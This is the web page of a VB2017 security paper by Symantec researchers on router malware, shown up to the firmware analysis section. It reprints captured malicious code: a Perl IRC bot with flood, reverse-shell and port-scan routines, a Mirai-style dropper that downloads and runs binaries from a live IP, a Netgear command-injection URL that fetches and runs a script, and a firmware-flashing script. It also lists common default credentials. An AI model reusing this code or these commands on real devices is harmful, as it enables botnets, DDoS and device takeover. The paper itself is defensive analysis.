<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: VB2017 paper: The router of all evil: more than just default passwords and silly scripts</title>
<meta name="description" content="In the last couple of years, we have seen a few highly sophisticated router attacks and pieces of malware. This paper looks at two case studies: the Netgear router attack involving the Multiple Netgear Routers Remote Command Injection Vulnerability (CVE-2016-6277), and the ShellShock vulnerability (CVE-2014-6271). The paper also discusses the objectives of Internet of Things (IoT) malware, which are primarily associated with distributed denial of service (DDoS) attacks and information stealers. " />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 5797;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/blocks/expand_collapse_toc/templates/vbexpand/view.css" />
<script type="text/javascript" src="/blocks/expand_collapse_toc/js/jquery.color.js"></script>
<script type="text/javascript" src="/blocks/expand_collapse_toc/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/blocks/expand_collapse_toc/js/expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<h1><a class="chapter" name="h1-vb2017-paper-router-all-evil-more-just-default-passwords-and-silly-scripts"></a>VB2017 paper: The router of all evil: more than just default passwords and silly scripts</h1>
<h3><a class="chapter" name="h3-himanshu-anand-amp-chastine-menrige"></a>Himanshu Anand &amp; Chastine Menrige</h3>
<p>Symantec, India</p>
<p><em>Copyright © 2017 Virus Bulletin</em></p>
<hr />
<p> </p>
<div class="ccm-expand-collapse-toc">
<div id="ccm-expand-collapse-toc-title-11924" class="ccm-expand-collapse-toc-title ccm-expand-collapse-toc-closed" data-expander-speed="500">Table of contents</div><div id="ccm-expand-collapse-toc-content-11924" class="ccm-expand-collapse-toc-content"><p><a class="toc-level2" href="#h2-abstract">Abstract</a><br /> <a class="toc-level2" href="#h2-introduction">Introduction</a><br /> <a class="toc-level2" href="#h2-strategic-importance-routers-network">Strategic importance of routers in the network</a><br /> <a class="toc-level2" href="#h2-how-routers-can-be-infected">How routers can be infected</a><br /> <a class="toc-level2" href="#h2-why-routers-are-infected">Why routers are infected</a><br /> <a class="toc-level2" href="#h2-types-malware-associated-routers">Types of malware associated with routers</a><br /> <a class="toc-level3" href="#h3-scripts">Scripts</a><br /> <a class="toc-level3" href="#h3-compiled">Compiled</a><br /> <a class="toc-level3" href="#h3-firmware">Firmware</a><br /> <a class="toc-level4" href="#h4-exploit">The exploit</a><br /> <a class="toc-level4" href="#h4-content-bash-script">Content of bash script</a><br /> <a class="toc-level4" href="#h4-analysis-firmware">Analysis of firmware</a><br /> <a class="toc-level4" href="#h4-what-it-uploading">What is it uploading?</a><br /> <a class="toc-level2" href="#h2-notable-router-attacks">Notable router attacks</a><br /> <a class="toc-level3" href="#h3-hacking-team-takedown">Hacking Team takedown</a><br /> <a class="toc-level2" href="#h2-tool-firmadyne">The tool: Firmadyne</a><br /> <a class="toc-level2" href="#h2-references">References</a></p><p>&nbsp;</p></div></div>
<h2><a class="chapter" name="h2-abstract"></a>Abstract</h2>
<p>In the last couple of years, we have seen a few highly sophisticated router attacks and pieces of malware, the most famous of which are the <em>Cisco</em> exploit (CVE-2016-6366), which was found among one of the data dumps by the Shadow Brokers hacking group in 2016, and the zero-day exploit in networking devices that took down the Italian <em>Hacking Team</em> in 2015.</p>
<p>While researching router exploits and malware, we came across some very interesting examples of router malware and malicious firmware. This paper looks at two case studies:</p>
<ul>
<li>The <em>Netgear</em> router attack involving the Multiple Netgear Routers Remote Command Injection Vulnerability (CVE-2016-6277) [<a href="#ref1">1</a>] and malicious firmware associated with it, which was flashed remotely, as well as the use of the Firmware Mod Kit (FMK) for the development of malicious firmware.</li>
<li>The ShellShock vulnerability (CVE-2014-6271) and related vulnerabilities (CVE-2014-6277 [<a href="#ref2">2</a>], CVE‑2014‑6278 [<a href="#ref3">3</a>], CVE-2014-7169 [<a href="#ref4">4</a>], CVE‑2014‑7186 [<a href="#ref5">5</a>], and CVE-2014-7187 [<a href="#ref6">6</a>]), which were used to compromise routers and infect them with .ELF malware, as well as infect them using Perl-based IRC bots.</li>
</ul>
<p>Finally, this paper discusses the objectives of Internet of Things (IoT) malware, which are primarily associated with distributed denial of service (DDoS) attacks and information stealers. A few such attacks have involved man-in-the-middle (MitM) threats and Domain Name System (DNS) changers. Moreover, this paper discusses how attackers exploit networks, what the future of router exploits holds, and how such attacks could be very dangerous for both corporate and home users.</p>
<p> </p>
<h2><a class="chapter" name="h2-introduction"></a>Introduction</h2>
<p>Routers are networking devices that serve as the gateway for both home and corporate networks, from Internet of Things (IoT) devices to computers over which people carry out banking or other important and confidential activities. Having control of this gateway gives attackers access to all the computers and/or devices in the network, as well as all the data passing through it.</p>
<p>This is a prime reason why home routers are a new frontier for cybercriminals and could prove to be one of the biggest attack vectors. Attacks involving compromised routers have been around for a long time. In 2007, attackers exploited a vulnerability to change the DNS settings of more than 4.5 million DSL modems in Brazil. In March 2014, <em>Team Cymru</em> reported that over 300,000 home routers had been compromised and had had their DNS settings changed in an attack campaign [<a href="#ref7">7</a>]. In September 2014, there was another huge attack on routers across Brazil [<a href="#ref8">8</a>].</p>
<p>These attacks mostly exploit two vulnerabilities:</p>
<ul>
<li>Cross-Site Request Forgery (CSRF)</li>
<li>Default passwords</li>
</ul>
<p>An attack occurred in 2007 [<a href="#ref9">9</a>] in which a proof-of-concept (PoC) code against home routers was published. This attack was possible and proved successful because default router passwords could easily be guessed. <em>Cisco</em> acknowledged that 77 of its routers had been vulnerable to CSRF [<a href="#ref10">10</a>]. The problem of default passwords is still serious in today's threat landscape. This was apparent in attacks involving the infamous Mirai botnet, which attackers leveraged to infect hundreds of thousands of IoT devices that were subsequently used for further attacks [<a href="#ref11">11</a>].</p>
<p> </p>
<h2><a class="chapter" name="h2-strategic-importance-routers-network"></a>Strategic importance of routers in the network</h2>
<p>The strategic placement of routers in the network incorporates elements of dependability in order to detect and correct errors in data packets. The router performs two main functions:</p>
<ol>
<li>Control path routing:<br /><br />The routing process usually directs forwarding on the basis of routing tables, which maintain a record of the routes to various network destinations. Thus, the construction of routing tables, which are held in the router's memory, is very important for efficient routing. Most routing algorithms use only one network path at a time. Multi-path routing techniques enable the use of multiple alternative paths.<br /><br /></li>
<li>Data path control (switching):<br /><br />Networking tries to solve the specific needs of storage networks by changing the communication paths. 'Connection failure' messages mean the connection retired. Error recovery in minutes is acceptable for message networks; for storage networks, it should be within seconds, preferably milliseconds. Because of these differences, storage network routing must include redundant, well-defined paths, enable fast path changes, and update the altered topology information rapidly.</li>
</ol>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/2015/1627/4689/router-all-evil-fig1.jpg" alt="router-all-evil-fig1.jpg" width="654" height="408" /><span class="centered-caption">Figure 1: Placement of the router in the network.</span></p>
<p>As shown in <a href="#figure2">Figure 2</a>, all the traffic comes in via input ports, goes inside the router to perform some switching and routing processing, before going out via output ports.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/8915/1627/4890/router-all-evil-fig2.jpg" alt="router-all-evil-fig2.jpg" width="289" height="192" /><span class="centered-caption"><a class=" anchor" name="figure2"></a>Figure 2: Architecture of a router.</span></p>
<p> </p>
<h2><a class="chapter" name="h2-how-routers-can-be-infected"></a>How routers can be infected</h2>
<p>Routers play an important role in the exchange of information within the network. Controlling a router gives the attacker access to the affected computers and/or devices and the data that passes through them.</p>
<p>The following are some types of attacks that can be used in infecting routers:</p>
<ul>
<li>Default password-based attack:<br /><br />Home routers are often designed to be plugged in and forgotten about after a very basic set-up. Often, users do not bother to configure their own settings and just go with the default ones. Most users do not mind using the default passwords since some router manufacturers provide unique admin passwords that are printed on permanent stickers along with other details like the model and MAC address. Some ISPs also lease routers with default passwords and forbid users from changing them.<br /><br />Many attackers are aware of such practices so they pre-program their malware to make use of commonly used or default passwords [<a href="#ref12">12</a>]. They can also mount a brute-force attack and attempt to guess the password using a dictionary of words. This attack could take a short period of time if the password is considerably weak.<br /><br />Attacks on <em>Symantec</em>'s honeypot revealed the most common passwords used by IoT malware in attempting to log into devices, as shown in <a href="#table1">Table 1</a>. The most up-to-date default password database can be found at http://www.routerpasswords.com/.<br />
<table class="table table-bordered" border="0">
<tbody>
<tr>
<td><strong>Top usernames</strong></td>
<td><strong>Top passwords</strong></td>
</tr>
<tr>
<td>root</td>
<td>admin</td>
</tr>
<tr>
<td>admin</td>
<td>root</td>
</tr>
<tr>
<td>DUP root</td>
<td>123456</td>
</tr>
<tr>
<td>ubnt</td>
<td>12345</td>
</tr>
<tr>
<td>access</td>
<td>ubnt</td>
</tr>
<tr>
<td>DUP admin</td>
<td>password</td>
</tr>
<tr>
<td>test</td>
<td>1234</td>
</tr>
<tr>
<td>oracle</td>
<td>test</td>
</tr>
<tr>
<td>postgres</td>
<td>qwerty</td>
</tr>
<tr>
<td>pi</td>
<td>raspberry</td>
</tr>
</tbody>
</table>
<span class="centered-caption"><a class=" anchor" name="table1"></a>Table 1: Top 10 brute-force usernames and passwords used against IoT devices [<a href="#ref13">13</a>].</span></li>
<li>Exploits<br /><br />ShellShock and other router-specific exploits.<br /><br /></li>
<li>Firmware backdoor directly from vendor<br /><br />Vendors put in a backdoor and supply it to users.</li>
</ul>
<p> </p>
<h2><a class="chapter" name="h2-why-routers-are-infected"></a>Why routers are infected</h2>
<p>Once attackers gain access to a router, they can change DNS settings and gain control over data passing through the network. Intercepted data can be leveraged to deploy malware, display ads, or perform phishing attacks on the computers within the same network.</p>
<ul>
<li>Performing DDoS attacks:<br /><br />Attackers hijack devices to add them to a botnet. Most of these botnets are used to perform distributed denial of service (DDoS) attacks on other, more valuable victims. The attacker uses scripts on the routers to launch such an attack. When triggered, potentially thousands of routers can send packets to the targeted victim all at the same time, overpowering the victim's resources and impacting its services and business.<br /><br />In September 2016, <em>Sucuri</em> identified a massive DDoS attack launched from three different types of botnets, including home router botnets [<a href="#ref14">14</a>]. This attack is considered the biggest case of infected routers to date.<br /><br /></li>
<li>Harvesting credentials:<br /><br />In recent attacks, we found that as routers gained control of all the network traffic, attackers would harvest credentials from computers within the network.<br /><br /></li>
<li>Spying:<br /><br />Multiple router exploits were found in a recent dump by the Shadow Brokers. This underlines how powerful attackers can effectively use routers for spying on the whole network, and not only on each specific endpoint.</li>
</ul>
<p> </p>
<h2><a class="chapter" name="h2-types-malware-associated-routers"></a>Types of malware associated with routers</h2>
<h3><a class="chapter" name="h3-scripts"></a>Scripts</h3>
<p>In 2014, attackers took advantage of the GNU Bash Remote Code Execution Vulnerability (CVE-2014-6271) [<a href="#ref14">14</a>], also known as Bash Bug or ShellShock, as well as its related vulnerabilities (CVE-2014-6277 [<a href="#ref2">2</a>], CVE-2014-6278 [<a href="#ref3">3</a>], CVE-2014-7169 [<a href="#ref4">4</a>], CVE-2014-7186 [<a href="#ref5">5</a>], and CVE-2014-7187 [<a href="#ref6">6</a>]), to compromise routers and infect them using Perl-based IRC bots [<a href="#ref16">16</a>] (see<a href="#figure3"> Figure 3</a>).</p>
<pre>#!/usr/bin/perl<br />#-shell @ddos<br />#-shell @commands<br />#-shell @irc<br />############################################<br />my $processo = 'usr/sbin/httpd';<br />my $linas_max='10';<br />my $sleep='5';<br />my $cmd="";<br />my $id="";<br />############################################<br />my @adms=("Asap", "Viz");<br />my @canais=("#buttholes");<br />my $chanpass = "";<br />$num = int rand(99999);<br />my $nick = "[L]" . $num . "";<br />my $ircname ='[L]';<br />chop (my $realname = '[L]');<br />$servidor='23.95.43.182' unless $servidor;<br />my $porta='8080';<br />############################################</pre>
<p class="centered-caption"><a class=" anchor" name="figure3"></a>Figure 3: Code snippet of a Perl-based IRC bot.</p>
<p>The said bots can perform a DDoS attack when triggered by sending a UDP, SYN, or HTTP flood (<a href="#figure4">Figure 4</a>).</p>
<pre>#####################<br />#     UDPFlood       #<br />######################<br />if ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) {<br />     sendraw($IRC_cur_socket, "PRIVMSG $printl : 13[ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="427602">[email&#160;protected]</a> 3UDP-DDOS 13] Attacking 4 ".$1.":".$2." 13for 4 ".$3." 13seconds.");<br />     $iaddr = inet_aton("$1") or die "Fuck wrong ip";<br />     $endtime = time() + ($3 ? $3 : 1000000);<br />     socket(flood, PF_INET, SOCK_DGRAM, 17);<br />     $port = "80";<br />     for (;time() &lt;= $endtime;) {<br />     $2 = $2 ? $2 : int(rand(1024-64)+64) ;<br />     $port = $port ? $port : int(rand(65500))+1;<br />     send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($2, $iaddr));}<br />     sendraw($IRC_cur_socket,"PRIVMSG $printl : 13[ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="063246">[email&#160;protected]</a> 3UDP-DDOS 13] Attack done 4 ".$1.":".$2.".");<br />  }<br />######################<br />#     TCPFlood       #<br />######################</pre>
<pre>  if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {<br />     sendraw($IRC_cur_socket, "PRIVMSG $printl : 12[ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="083c48">[email&#160;protected]</a> 3TCP-DDOS 12] Attacking 4 ".$1.":".$2." 12for 4 ".$3." 12seconds.");<br />     my $itime = time;<br />     my ($cur_time);<br />     $cur_time = time - $itime;<br />     while ($3&gt;$cur_time){<br />        $cur_time = time - $itime;<br />        &amp;tcpflooder("$1","$2","$3");<br />    }<br />    sendraw($IRC_cur_socket,"PRIVMSG $printl : 12[ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="546014">[email&#160;protected]</a> 3TCP-DDOS 12] Attack done 4 ".$1.":".$2.".");<br />  }<br />######################<br />#  End of TCPFlood   #<br />######################</pre>
<p class="centered-caption"><a class=" anchor" name="figure4"></a>Figure 4: Code snippet of a DDoS attack routine.</p>
<p>The bot is also capable of a back-connect shell, also known as reverse shell, to communicate back to the command-and-control (C&amp;C) server, instead of just opening a port and listening for a remote attacker to connect (<a href="#figure5">Figure 5</a>).</p>
<pre>######################<br />#   Back Connect     #</pre>
<pre>######################<br />     if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {<br />     sendraw($IRC_cur_socket, "PRIVMSG $printl : 12[ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e8dca8">[email&#160;protected]</a> 3Back-Connect 12]:::...  I don't know, I'm watching a show tho");</pre>
<pre>     }<br />     if ($funcarg =~ /^shhcon\s+(.*)\s+(\d+)/) {<br />        my $host = "$1";<br />        my $porta = "$2";<br />        my $proto = getprotobyname('tcp');<br />        my $iaddr = inet_aton($host);<br />        my $paddr = sockaddr_in($porta, $iaddr);<br />        my $shell = "/bin/sh -i";<br />        if ($^O eq "MSWin32") {<br />            $shell = " cmd.exe";<br />        }<br />        socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";<br />        connect(SOCKET, $paddr) or die "connect: $!";<br />        open(STDIN, "&gt;&amp;SOCKET");<br />        open(STDOUT, "&gt;&amp;SOCKET");<br />        open(STDERR, "&gt;&amp;SOCKET");<br />        system("$shell");<br />        close(STDIN);<br />        close(STDOUT);<br />        close(STDERR);<br />        if ($estatisticas){<br />            sendraw($IRC_cur_socket, "PRIVMSG $printl : 12[ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="437703">[email&#160;protected]</a> 3Back-Connect 12] Connecting to 4 $host:$porta");<br />        }<br />     }<br />######################<br />#End of  Back Connect#<br />######################</pre>
<p class="centered-caption"><a class=" anchor" name="figure5"></a>Figure 5: Code snippet of a back-connect shell routine.</p>
<p>The bot also has features like port scanning and checks if a port from the list is open (<a href="#figure6">Figure 6</a>).</p>
<pre>######################<br />#      Portscan      #<br />######################</pre>
<pre>     if ($funcarg =~ /^portscan (.*)/) {<br />        my $hostip="$1";<br />        @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79",<br />"80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389",<br />"389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636",<br />"694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079",<br />"1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223",<br />"5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000",<br />"8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");<br />        my (@aberta, %porta_banner);<br />        sendraw($IRC_cur_socket, "PRIVMSG $printl : 12[ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c3f783">[email&#160;protected]</a> 3Port-Scanner 12] Scanning for open ports on ".$1." 12 started .");<br />        foreach my $porta (@portas)  {<br />            my $scansock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $hostip, PeerPort =&gt; $porta, Proto =&gt;<br />                'tcp', Timeout =&gt; 4);<br />            if ($scansock) {<br />                push (@aberta, $porta);<br />                $scansock-&gt;close;<br />            }<br />        }</pre>
<pre>        if (@aberta) {<br />            sendraw($IRC_cur_socket, "PRIVMSG $printl : 12[ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="023642">[email&#160;protected]</a> 3Port-Scanner 12] Open ports founded: @aberta");<br />        } else {<br />            sendraw($IRC_cur_socket, "PRIVMSG $printl : 12[ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="417501">[email&#160;protected]</a> 3Port-Scanner 12] No open ports foundend.");<br />        }<br />     }</pre>
<pre>######################<br />#  End of  Portscan  #<br />#####################</pre>
<p class="centered-caption"><a class=" anchor" name="figure6"></a>Figure 6: Code snippet of a port scanning routine.</p>
<p> </p>
<h3><a class="chapter" name="h3-compiled"></a>Compiled</h3>
<p>Mirai (Linux.Gafgyt) [<a href="#ref17">17</a>] is an infamous worm that took advantage of routers' default passwords in late 2016 [<a href="#ref18">18</a>]. The most common type found downloaded malware compiled for multiple platforms and then tried to execute them (<a href="#figure7">Figure 7</a>).</p>
<pre>#!/bin/bash<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/sshd; chmod +x sshd; ./sshd; rm -rf sshd<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/openssh; chmod +x openssh; ./openssh; rm -rf openssh<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/bash; chmod +x bash; ./bash; rm -rf bash<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/tftp; chmod +x tftp; ./tftp; rm -rf tftp<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/wget; chmod +x wget; ./wget; rm -rf wget<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/cron; chmod +x cron; ./cron; rm -rf cron<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/ftp; chmod +x ftp; ./ftp; rm -rf ftp<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/pftp; chmod +x pftp; ./pftp; rm -rf pftp<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/sh; chmod +x sh; ./sh; rm -rf sh<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/' '; chmod +x ' '; ./' '; rm -rf ' '<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/apache2; chmod +x apache2; ./apache2; rm -rf apache2<br />cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd</pre>
<p class="centered-caption"><a class=" anchor" name="figure7"></a>Figure 7: Code snippet of Mirai worm.</p>
<p> </p>
<h3><a class="chapter" name="h3-firmware"></a>Firmware</h3>
<p>Attackers were found flashing <em>Netgear</em> home routers remotely using the Multiple Netgear Routers Remote Command Injection Vulnerability (CVE-2016-6277) [<a href="#ref1">1</a>], which allowed an unauthenticated user to inject commands into HTTP requests that were then executed on the device.</p>
<pre>http:// [Victime]:8080/cgi-bin/;nvram$IFS\set$IFS\http_passwd;nvram$IFS\set$IFS\http_username;nvram$IFS\commit;sleep$IFS\2;cd$IFS\/tmp;wget$IFS\http:\/\/[attacker controlled server]\/h\/wrt\/uge.sh;chmod$IFS\777$IFS\/tmp/uge.sh;/bin/sh$IFS\/tmp/uge.sh</pre>
<p> </p>
<h4><a class="chapter" name="h4-exploit"></a>The exploit</h4>
<p>The exploit consists of the following steps:</p>
<ol>
<li>Downloading shell script from http://[ATTACKER-CONTROLLED SERVER]/h/wrt/uge.sh.</li>
<li>Changing the shell script's access permission to 777.</li>
<li>Executing the bash script.</li>
</ol>
<p> </p>
<h4><a class="chapter" name="h4-content-bash-script"></a>Content of bash script</h4>
<p>The shell script (shown in <a href="#figure8">Figure 8</a>) checks whether /tmp/check112 already exists, and that the size is not 0.</p>
<p>Getting to the end of the shell script reveals that it downloads a bin file from http://94.156.35.78/h/wrt/112.bin. After downloading the file, the shell script executes a 'write' command on the downloaded file. For example:</p>
<pre class="monospace">write 112.bin linux</pre>
<pre>#!/bin/sh<br />if [[ -s /tmp/check112 ]]; then<br />uptime<br />#echo&gt;/tmp/check98<br />#killall -HUP dnsmasq<br />#nvram set dnsmasq_enable=1<br />#nvram set local_dns=0<br />#nvram set dnsmasq_options=<br />#nvram commit<br />#/sbin/reboot<br />#cd /tmp<br />#/usr/bin/wput h5.sh ftp://root:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1572797c66667471742d2d552d213b2726223b2726253b2022">[email&#160;protected]</a>/mnt/hdd/backup/ok/ &amp;<br />#process_id=$!<br />#wait process_id<br />else<br />echo&gt;/tmp/check112<br />cd /tmp<br />#nvram set dnsmasq_enable=1<br />#nvram set local_dns=0<br />#nvram set dnsmasq_options=<br />#nvram commit<br />#echo 'sdsffsdfsdffffffffffffff'&gt;/tmp/check8<br />echo "sleep 420;/sbin/reboot"&gt;/tmp/ar.sh<br />chmod 777 /tmp/ar.sh<br />/bin/sh /tmp/ar.sh &amp;<br />#nvram set rc_startup=<br />#nvram commit<br />sleep 2<br />#rm -rf /tmp/ds2;rm -rf /tmp/ds;rm -rf 2.sh;rm -rf 3.sh;rm -rf 4.sh;rm -rf arp;rm -rf arp1.sh;rm -rf arp2.sh;rm -rf df;rm -rf ds;rm -rf ds1.sh;rm -rf ds10.txt;rm -rf ds2.sh;rm -rf ds3.sh;rm -rf ds4.sh;rm -rf dyn1.sh;rm -rf dyn2.sh;rm -rf h5.sh;rm -rf i5.sh;rm -rf inadyn1.conf;rm -rf lp;rm -rf lp.sh;rm -rf lp1.sh;rm -rf lp2;rm -rf lp2.sh;rm -rf lp8.txt;rm -rf nv;rm -rf nvr1.sh;rm -rf nvr2.sh;rm -rf ovpn.sh;rm -rf ovpn1.sh;rm -rf ovpn2.sh;rm -rf remo1.sh;rm -rf remo2.sh;rm -rf remo4;rm -rf sf;rm -rf uname;rm -rf uname1.sh;rm -rf uname2.sh;rm -rf vpn.sh;rm -rf vpn1.sh;rm -rf vpn2.sh;rm -rf vr;rm -rf vr.sh;rm -rf vr1.sh;rm -rf vr2.sh;rm -rf vr8.txt;rm -rf /tmp/bin/wput;rm -rf /tmp/usr/lib/*;rm -rf /tmp/usr/sbin/*<br />#cd /tmp<br />##!!!!!! wget http://178.57.115.231:8081/h/wrt/custom_image_00021.bin &amp;<br />wget http://94.156.35.78/h/wrt/112.bin &amp;<br />process_id=$!<br />wait $process_id<br />write 112.bin linux<br />/sbin/reboot<br />Fi</pre>
<p class="centered-caption"><a class=" anchor" name="figure8"></a>Figure 8: This shell script checks whether /tmp/check112 already exists, and that the size is not 0.</p>
<p> </p>
<h4><a class="chapter" name="h4-analysis-firmware"></a>Analysis of firmware</h4>
